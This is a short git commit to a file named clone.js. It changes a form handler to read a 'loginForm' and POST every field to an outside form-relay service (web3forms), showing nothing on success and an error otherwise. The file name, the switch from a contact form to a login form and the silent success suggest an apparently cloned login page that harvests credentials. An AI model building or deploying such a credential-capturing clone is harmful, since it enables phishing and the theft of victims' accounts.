87cad850497547b0086ad785666ae17c89f6abf2
mohd shariq <mohdshariq0033@gmail.com>
2025-10-30 21:32:20 +0530

    fix api

--- clone.js
+++ clone.js
@@ -1,11 +1,13 @@
-const form = document.getElementById('contactForm');
+const form = document.getElementById('loginForm');
 const result = document.getElementById('result');
 
 form.addEventListener('submit', async (e) => {
-  e.preventDefault();
+  e.preventDefault(); // stop page reload
+
   result.textContent = "";
 
   const formData = new FormData(form);
+  
   const response = await fetch("https://api.web3forms.com/submit", {
     method: "POST",
     body: formData
@@ -15,8 +17,8 @@ form.addEventListener('submit', async (e) => {
 
   if (data.success) {
     result.textContent = "";
-    form.reset();
+    form.reset(); // clear form
   } else {
-    result.textContent = "";
+    result.textContent = "❌ Something went wrong. Try again.";
   }
 });
